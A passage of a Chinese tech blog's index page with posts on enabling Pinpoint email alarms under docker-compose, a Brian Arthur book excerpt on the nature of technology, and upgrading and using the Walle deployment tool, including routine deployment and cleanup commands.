&#x27;AgentStatV2&#x27;</span><br><span class="line">describe &#x27;AgentStatV2&#x27;</span><br><span class="line">major_compact  &#x27;AgentStatV2&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2019/04/24/2019/04/2019-04-24-docker-compose%E9%83%A8%E7%BD%B2pinpoint%E5%BC%80%E5%90%AFemail%E6%8A%A5%E8%AD%A6%E5%8A%9F%E8%83%BD/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/24/2019/04/2019-04-24-docker-compose%E9%83%A8%E7%BD%B2pinpoint%E5%BC%80%E5%90%AFemail%E6%8A%A5%E8%AD%A6%E5%8A%9F%E8%83%BD/index/" class="post-title-link" itemprop="url">docker-compose部署pinpoint开启email报警功能</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-04-24 08:00:00" itemprop="dateCreated datePublished" datetime="2019-04-24T08:00:00+08:00">2019-04-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:31" itemprop="dateModified" datetime="2023-05-26T15:06:31+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/" itemprop="url" rel="index"><span itemprop="name">middleware</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="做事前认真阅读下Readme文档，磨刀不误砍柴工"><a href="#做事前认真阅读下Readme文档，磨刀不误砍柴工" class="headerlink" title="做事前认真阅读下Readme文档，磨刀不误砍柴工"></a><strong>做事前认真阅读下Readme文档，磨刀不误砍柴工</strong></h2><h2 id="Pinpoint-Docker-for-Pinpoint"><a href="#Pinpoint-Docker-for-Pinpoint" class="headerlink" title="Pinpoint-Docker for Pinpoint"></a><strong>Pinpoint-Docker for Pinpoint</strong></h2><p>Official git repository of Dockerized components of the <a target="_blank" rel="noopener" href="http://naver.github.io/pinpoint/">Pinpoint Application Monitoring</a>.<br>Installing Pinpoint with these docker files will take approximately 10min. to check out the features of pinpoint.</p>
<h2 id="What-is-Pinpoint"><a href="#What-is-Pinpoint" class="headerlink" title="What is Pinpoint"></a><strong>What is Pinpoint</strong></h2><p><a target="_blank" rel="noopener" href="https://github.com/naver/pinpoint">Pinpoint</a>, is the world’s leading open-source application monitoring solution - trusted by millions of users around the globe. It supports and helps you understand your application in a glance and allow you to build world-class, high-quality software.</p>
<h2 id="Supported-Tags"><a href="#Supported-Tags" class="headerlink" title="Supported Tags"></a><strong>Supported Tags</strong></h2><ul>
<li>1.8.2</li>
<li>1.8.1</li>
<li>1.8.0</li>
<li>1.7.3</li>
<li>1.7.2</li>
</ul>
<h2 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a><strong>Requirements</strong></h2><ul>
<li><a target="_blank" rel="noopener" href="https://docs.docker.com/compose/compose-file/">docker 18.02.0+</a></li>
</ul>
<h2 id="How-to-install-Pinpoint"><a href="#How-to-install-Pinpoint" class="headerlink" title="How to install Pinpoint?"></a><strong>How to install Pinpoint?</strong></h2><p>You can easily bring up an entire Dockerized Pinpoint(latest release) environment by using <a target="_blank" rel="noopener" href="https://docs.docker.com/compose/">Docker Compose</a> with any of the provided <code>docker-compose.yml</code> files as below.<br>With <code>docker-compose.yml</code> under <em>Pinpoint-Docker</em> folder brings up all the environment attached with Pinpoint-QuickStart(sample app). To monitor your agent see <a href="#configurations">configuration part</a> for further details.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/naver/pinpoint-docker.git</span><br><span class="line">cd pinpoint-docker</span><br><span class="line">docker-compose pull &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>If you’d like to bring up a previous release. Try with docker-compose file from other tags.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/naver/pinpoint-docker.git</span><br><span class="line">git checkout &#123;tag&#125;</span><br><span class="line">cd pinpoint-docker</span><br><span class="line">docker-compose pull &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>You can also build the image with <code>docker-compose up -d</code> command without pulling the image. But you can reduce the time to 1&#x2F;3 by just downloading them.</p>
<p>This will install and run all services required to run all features in Pinpoint in docker containers joined with same network. - Pinpoint-Web Server - Pinpoint-Collector - Pinpoint-Agent - Pinpoint-Flink(to support certain feature) - Pinpoint-Zookeeper - Pinpoint-Hbase - Pinpoint-QuickStart(a sample application, 1.8.1+) - Pinpoint-Mysql(to support certain feature) This may take several minutes to download all necessary images.</p>
<p>You can replace <code>QuickStart</code> application part with your application to start monitoring.<br>- check <a href="#testing-quickstart-application"><code>Testing QuickStart application</code></a> for a quick demo of pinpoint - check <a href="#monitoring-your-application"><code>Monitoring YOUR Application</code></a> part for further details</p>
<h3 id="Mysql-optional-1-8-1"><a href="#Mysql-optional-1-8-1" class="headerlink" title="Mysql (optional, 1.8.1+)"></a><strong>Mysql (optional, 1.8.1+)</strong></h3><p>The Pinpoint-Mysql is necessary to use ‘Alarm’ feature. It’s server is running on port 13306 and contains the data structure used to register users, groups, and alerts to be sent.</p>
<p>To send email alerts, you must make BATCH_ENABLE&#x3D;true and change the other mail-related environment variables (MAIL_HOST, MAIL_PORT, MAIL_USERNAME, MAIL_PASSWORD, MAIL_PROPERTIES_MAIL_SMTP_FROM, …) to the Pinpoint-Web server in <em>.env</em> file.</p>
<p>For more information checkout <a target="_blank" rel="noopener" href="http://naver.github.io/pinpoint/alarm.html">Setting Alarm</a> in Pinpoint documentation.</p>
<h3 id="Flink-configuration-optional"><a href="#Flink-configuration-optional" class="headerlink" title="Flink configuration (optional)"></a><strong>Flink configuration (optional)</strong></h3><p>The Pinpoint-Flink is necessary to use <a target="_blank" rel="noopener" href="http://naver.github.io/pinpoint/applicationinspector.html">‘Application Inspector’</a> feature.</p>
<p>After all containers are started and ready to go. There is one more thing to do to use all existing features in Pinpoint. It’s not mandatory, but to use all the features and since it’s a simple task, let’s take care of it.</p>
<p>Register a <code>job</code> on to pinpoint-flink server.<br>You can build the <code>job</code> from the <a target="_blank" rel="noopener" href="https://github.com/naver/pinpoint">open-source of Pinpoint</a>, additional guide is <a target="_blank" rel="noopener" href="https://github.com/naver/pinpoint/blob/master/doc/application-inspector.md#application-inspector">here</a>.<br>or<br>you can simply upload pre-built jar file under pinpoint-flink&#x2F;build&#x2F;pinpoint-flink-job-{pinpoint-version}.jar (beware of the version, it should matched with <em>PINPOINT_VERSION</em> in .env file)<br>If anyone have solution to put the job file into flink image without doing manually, please let us know.</p>
<p>Pinpoint-Flink server is running on <a target="_blank" rel="noopener" href="http://localhost:8081/#/submit">port 8081</a>. From <code>submit new job</code> menu Submit the jar file with <em>com.navercorp.pinpoint.flink.StatStreamingVer2Job</em> in entry class as below image.</p>
<h3 id="Testing-QuickStart-application"><a href="#Testing-QuickStart-application" class="headerlink" title="Testing QuickStart application"></a><strong>Testing QuickStart application</strong></h3><p>Now you are ready to monitor the sample application(Pinpoint-QuickStart <a target="_blank" rel="noopener" href="http://localhost:8000/">port 8000</a>) provided. If you can’t find any connected application from Pinpoint-Web’s first page(<a target="_blank" rel="noopener" href="http://localhost:8079/">port 8079</a> as default), don’t panic and wait for a while. It will take some time for Pinpoint to retrieve the application’s information when running for the first time.</p>
<h2 id="Monitoring-YOUR-Application"><a href="#Monitoring-YOUR-Application" class="headerlink" title="Monitoring YOUR Application"></a><strong>Monitoring YOUR Application</strong></h2><p>Pinpoint-Agent only prepares required libraries for triggering Pinpoint-Agent. Running and configuring agents is manual action done by the user, but don’t worry it’s very simple.</p>
<p>If you are not familiar with Pinpoint concept, please read: <a target="_blank" rel="noopener" href="http://naver.github.io/pinpoint/overview.html#architecture">Overview</a>, <a target="_blank" rel="noopener" href="http://naver.github.io/pinpoint/installation.html#5-pinpoint-agent">Agents Installation</a></p>
<p><strong>You will need to attach <em>Pinpoint-Agent</em> to your application.</strong></p>
<p>Running Pinpoint-Agent docker-compose separately, Examples are <a target="_blank" rel="noopener" href="https://github.com/naver/pinpoint-docker/tree/master/pinpoint-agent-attach-example">here</a>.<br>Otherwise, you can check how <a target="_blank" rel="noopener" href="https://github.com/naver/pinpoint-docker/blob/master/docker-compose.yml">Pinpoint-Quickstart</a> is attached to Pinpoint-Agent with docker-compose.</p>
<p>We’ll try to create more examples along the way. If anyone who can share their dockerfile, it’s always welcome.</p>
<h2 id="Distributed-System"><a href="#Distributed-System" class="headerlink" title="Distributed System"></a><strong>Distributed System</strong></h2><p>Until now, every components are in one docker, single-node approach, which is excellent for test and development. It provides an easy way to prototype new ideas and use cases, as well as try out new functionality and the latest Pinpoint releases. It’s not intended nor supported for production use.</p>
<p>You can use <code>docker-compose</code> and <code>.env</code> files under each folder to install the modules separately into several servers. If containers are separated, ip configurations in <code>.env</code> must be changed within.</p>
<p>For example, if you want your application running from a docker and rest of Pinpoint in another. You can remove <em>pinpoint-agent</em> and <em>pinpoint-quickstart</em> from docker-compose.yml and run to establish all necessary component of pinpoint. And create another docker-compose.yml just like one under pinpoint-quickstart folder to run your application. Finally, since agent needs to acknowledge the collector ip. collector ip needs to be changed in .env.</p>
<h2 id="Configurations"><a href="#Configurations" class="headerlink" title="Configurations"></a><strong>Configurations</strong></h2><p>Configuration relies on supplying <code>docker-compose</code> with environment variables defined in <code>.env</code> file. So it’s recommended to change variables only from <code>.env</code> file. With <code>docker-compose</code> in this repository. You can create stand-alone containers that are needed to run most of the features in Pinpoint.</p>
<p><strong>Ports</strong> can be also configured in .env file. (Default ports are Pinpoint-Web:8079, Quickstart:8000 and Flink:8081 as configured in .env file)</p>
<p>Pinpoint-Zookeeper is just an example of using zookeeper image. You can modify docker-compose files to suit your needs.</p>
<p>For more specific details on what the values represents in <em>.env</em> file. Please check <a target="_blank" rel="noopener" href="https://github.com/naver/pinpoint">Pinpoint Github Repository</a> or <a target="_blank" rel="noopener" href="https://github.com/naver/pinpoint/blob/master/web/src/main/resources/pinpoint-web.properties">Pinpoint Web properties</a>, <a target="_blank" rel="noopener" href="https://github.com/naver/pinpoint/blob/master/collector/src/main/resources/pinpoint-collector.properties">Pinpoint Collector properties</a>, <a target="_blank" rel="noopener" href="https://github.com/naver/pinpoint/blob/master/agent/src/main/resources-release/pinpoint.config">Pinpoint Agent configuration</a>.<br>Please note that only essential configuration options are adopted to pinpoint-docker(docker-compose).</p>
<h1 id="配置发邮件注意事项"><a href="#配置发邮件注意事项" class="headerlink" title="配置发邮件注意事项"></a><strong>配置发邮件注意事项</strong></h1><blockquote>
<p>To send email alerts, you must make BATCH_ENABLE&#x3D;true and change the other mail-related environment variables (MAIL_HOST, MAIL_PORT, MAIL_USERNAME, MAIL_PASSWORD, MAIL_PROPERTIES_MAIL_SMTP_FROM, …) to the Pinpoint-Web server in .env file.</p>
</blockquote>
<h2 id="首先在pinpoint-web环境变量文件里开启BATCH-ENABLE"><a href="#首先在pinpoint-web环境变量文件里开启BATCH-ENABLE" class="headerlink" title="首先在pinpoint-web环境变量文件里开启BATCH_ENABLE"></a><strong>首先在pinpoint-web环境变量文件里开启BATCH_ENABLE</strong></h2><p>激活BATCH</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_8_77_centos pinpoint-docker]# grep BATCH_ENABLE .env</span><br><span class="line">BATCH_ENABLE=true</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="其次设置好发邮件账号信息"><a href="#其次设置好发邮件账号信息" class="headerlink" title="其次设置好发邮件账号信息"></a><strong>其次设置好发邮件账号信息</strong></h2><p>按照实际情况填写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_8_77_centos pinpoint-docker]# grep MAIL .env</span><br><span class="line">MAIL_HOST=stmp.test.com</span><br><span class="line">MAIL_PORT=25</span><br><span class="line">MAIL_USERNAME=user</span><br><span class="line">MAIL_PASSWORD=pass</span><br><span class="line">MAIL_PROPERTIES_MAIL_TRANSPORT_PROTOCOL=smtp</span><br><span class="line">MAIL_PROPERTIES_MAIL_SMTP_AUTH=true</span><br><span class="line">MAIL_PROPERTIES_MAIL_SMTP_PORT=25</span><br><span class="line">MAIL_PROPERTIES_MAIL_SMTP_FROM=test@example.com</span><br><span class="line">MAIL_PROPERTIES_MAIL_STARTTLS_ENABLE=false</span><br><span class="line">MAIL_PROPERTIES_MAIL_STARTTLS_REQUIRED=false</span><br><span class="line">MAIL_PROPERTIES_MAIL_DEBUG=false</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="重新生成pinpoint-web容器"><a href="#重新生成pinpoint-web容器" class="headerlink" title="重新生成pinpoint-web容器"></a><strong>重新生成pinpoint-web容器</strong></h2><p>[root@VM_8_77_centos pinpoint-docker]# docker-compose kill pinpoint-web [root@VM_8_77_centos pinpoint-docker]# docker-compose rm pinpoint-web [root@VM_8_77_centos pinpoint-docker]# docker-compose up -d</p>
<h2 id="参考官网配置报警策略"><a href="#参考官网配置报警策略" class="headerlink" title="参考官网配置报警策略"></a><strong>参考官网配置报警策略</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/naver/pinpoint/blob/master/doc/alarm.md</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2019/04/21/2019/04/2019-04-21-%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%AC%E8%B4%A8/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/21/2019/04/2019-04-21-%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%AC%E8%B4%A8/index/" class="post-title-link" itemprop="url">技术的本质</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-04-21 08:00:00" itemprop="dateCreated datePublished" datetime="2019-04-21T08:00:00+08:00">2019-04-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:31" itemprop="dateModified" datetime="2023-05-26T15:06:31+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/method/" itemprop="url" rel="index"><span itemprop="name">method</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>布莱恩·阿瑟</strong> <strong>技术的本质</strong> 相对于只将技术看作实现目的的手段，我们现在有了更直接的描述：技术是被捕捉到并被使用的现象，或者更准确地说，技术是那些被捕获并加以利用的现象的集合（a collection of phenomena）。我在这里用的是“捕捉”这个词，但是还有许多词可以用。我还可以说，现象是为了某种目的而被驾驭、控制、缚住、应用、采用、利用，或者开发的。然而在我的心中，“被捕捉并使用”是我认为最确切的表述。</p>
<blockquote>
<p><strong>技术思想前沿</strong> 从本质上看，技术是被捕获并加以利用的现象的集合，或者说，技术是对现象有目的的编程。</p>
</blockquote>
<p>这种观察将我们带回到本书一开始提到的那个问题：技术的本质是什么？在最深的本质上，技术是什么呢？对我而言，答案就是我们刚才所说的：<strong>技术就是被捕获并使用的现象。或者反过来说，技术是被捕捉并被使用（put to use）的现象的集合。</strong> 它之所以是核心所在，是因为一个技术的基本概念，即，使技术成为技术的东西，总是利用了某个或某些从现象中挖掘出来的核心效应。在本质上，技术是指向某种目的的，被编程了的现象。我这里特意用“被编程”这个词，是要强调使技术成为技术的现象是以一种有计划的方式被组织起来的，它们为“使用”这个目的而“共谱乐章”。 如此一来，我们可以用另外一种方式来表述技术的本质：<strong>技术是对现象的有目的的编程（programming）。</strong></p>
<blockquote>
<p>每个技术都是通过对一组固定的现象以不同的方式进行“编程”创造出来的。当然，随着时间的推移，新的现象，新的技术“基因”会不断加入进来。现象不是直接地被组合，它们首先被捕获并表达（expressed）为技术的元素，然后才能被组合。尽管比起生物基因来，可用的现象要少得多，但我们还是做了这样的类比：<strong>生物对基因加以编程从而产生无数的结构，技术对现象加以编程从而产生无数的应用。</strong></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2019/04/18/2019/04/2019-04-18-%E7%93%A6%E5%8A%9B2-0-0%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7%E5%88%B02-0-1%E7%89%88%E6%9C%AC/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/18/2019/04/2019-04-18-%E7%93%A6%E5%8A%9B2-0-0%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7%E5%88%B02-0-1%E7%89%88%E6%9C%AC/index/" class="post-title-link" itemprop="url">瓦力2.0.0版本升级到2.0.1版本</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-04-18 08:00:00" itemprop="dateCreated datePublished" datetime="2019-04-18T08:00:00+08:00">2019-04-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:31" itemprop="dateModified" datetime="2023-05-26T15:06:31+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/" itemprop="url" rel="index"><span itemprop="name">middleware</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>参考这个文档<a target="_blank" rel="noopener" href="https://walle-web.io/docs/installation.html%EF%BC%8C">https://walle-web.io/docs/installation.html，</a> 注意文档中升级不是跨版本升级，跨版本哪怕是小版本升级需要这样操作</p>
</blockquote>
<p><strong>1.进入新目录下载代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/meolu/walle-web.git</span><br><span class="line">不可在原目录直接sh admin.sh upgrade，该升级不是跨版本升级</span><br></pre></td></tr></table></figure>

<p><strong>2.修改nginx目录到新目录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root /data1/walle-web2.0.1/fe/</span><br><span class="line">然后reload nginx进程</span><br></pre></td></tr></table></figure>

<p><strong>3.初始化</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh admin.sh init</span><br><span class="line">主要是生成/data1/walle-web2.0.1/venv目录文件</span><br></pre></td></tr></table></figure>

<p><strong>4.重启、升级、Migration</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh admin.sh restart # 重启</span><br><span class="line">sh admin.sh upgrade # 升级walle，升级完需要重启walle服务。升级前最好 git stash 暂存本地修改，升级后git stash pop弹出暂存，然后重启服务。</span><br><span class="line">sh admin.sh migration # Migration</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2019/04/18/2019/04/2019-04-18-%E7%93%A6%E5%8A%9B2-0%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/18/2019/04/2019-04-18-%E7%93%A6%E5%8A%9B2-0%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/index/" class="post-title-link" itemprop="url">瓦力2.0使用介绍</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-04-18 08:00:00" itemprop="dateCreated datePublished" datetime="2019-04-18T08:00:00+08:00">2019-04-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:31" itemprop="dateModified" datetime="2023-05-26T15:06:31+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/" itemprop="url" rel="index"><span itemprop="name">middleware</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>一.简介</strong></p>
<blockquote>
<p>walle支持各种web代码发布，php、java、python、go等代码的发布、回滚可以通过web来一键完成。walle 一个可自由配置项目，更人性化，高颜值，支持git、多用户、多语言、多项目、多环境同时部署的开源上线部署系统。</p>
</blockquote>
<p><strong>二.权限模型</strong></p>
<blockquote>
<p>超管 所有权限（有空间、用户、项目、部署管理权限，类似公司Leader） 空间所有者 所属空间所有权限（用户、项目、部署管理权限，类似部门Leader） 项目管理者 项目管理（项目、部署管理权限，类似组Leader） 开发者 上线申请（部署权限，类似员工） 访客 默认不用</p>
</blockquote>
<p><strong>三.运维操作</strong> 1. 添加用户 2. 超级管理员创建空间</p>
<p><strong>四.开发操作</strong> 1. 空间所有者选择成员到自己空间并设置成员角色 2. 空间所有者新增环境 3. 空间所有者添加服务器 4. 空间所有者新建项目，注意项目要归属某一环境 5. 空间所有者提交项目后，可以设置项目成员管理 6. 项目管理者只能管理编辑项目，不能新建 7. 开发者创建上线单并提交上线单 8. 开发者只能提交上线单需要项目管理者审核 9. 开发者或者项目管理者开始上线 10. 上线成功会发邮件通知</p>
<p><strong>五．瓦力工作流程原理</strong> 1. 前半部分是从gitlab上下载代码，默认只要只读权限即可，下载代码在瓦力默认目录&#x2F;data1&#x2F;codebase&#x2F;下，然后瓦力复制为日期命名再打包，打包时排除相关文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> [www@127.0.0.1]$ cp -rf /data1/codebase/3 3_13_20190417_194649</span><br><span class="line">[www@127.0.0.1]$ tar zcf /data1/codebase/3_13_20190417_194649.tgz --exclude=.git --exclude=*.log 3_13_20190417_194649/</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>瓦力远程执行命令创建程序仓库目录，所以该目录必须对work有读写权限，建议&#x2F;data1&#x2F;目录下，然后远程拷贝瓦力准备好的代码（有的情况下需要先编译）到目标服务器代码仓库位置，再解压缩并做软链接保留历史版本，最后移动到程序目录并删除压缩包等不需要文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[work@10.2.100.38]$ mkdir -p /data1/release/k8s</span><br><span class="line">[www@127.0.0.1]$ scp /data1/codebase/3_13_20190417_194649.tgz work@10.2.100.38:/data1/release/k8s</span><br><span class="line">[work@10.2.100.38]$ tar zxf 3_13_20190417_194649.tgz</span><br><span class="line">[work@10.2.100.38]$ ln -sfn /data1/release/k8s/3_13_20190417_194649 /data1/release/k8s/current-tmp-13</span><br><span class="line">[work@10.2.100.38]$ mv -fT /data1/release/k8s/current-tmp-13 /data1/k8s</span><br><span class="line">[work@10.2.100.38]$ rm -rf 3_13_*.tgz</span><br><span class="line">[work@10.2.100.38]$ ls -t 3_* | tail -n +9 | xargs rm -rf</span><br><span class="line">[www@127.0.0.1]$ rm -rf 3_13_*</span><br></pre></td></tr></table></figure>

<p><strong>六．常用文档参考链接</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">用户配置</span><br><span class="line">https://walle-web.io/docs/configuration-user.html</span><br><span class="line">项目配置</span><br><span class="line">https://walle-web.io/docs/configuration-project.html</span><br><span class="line">Java项目配置模板</span><br><span class="line">https://walle-web.io/docs/configuration-project-java.html</span><br><span class="line">提交上线单</span><br><span class="line">https://walle-web.io/docs/submit-bill.html </span><br><span class="line">部署上线</span><br><span class="line">https://walle-web.io/docs/deploying.html</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2019/04/15/2019/04/2019-04-15-%E5%85%B3%E9%94%AE%E6%8F%90%E9%97%AE/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/15/2019/04/2019-04-15-%E5%85%B3%E9%94%AE%E6%8F%90%E9%97%AE/index/" class="post-title-link" itemprop="url">关键提问</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-04-15 08:00:00" itemprop="dateCreated datePublished" datetime="2019-04-15T08:00:00+08:00">2019-04-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
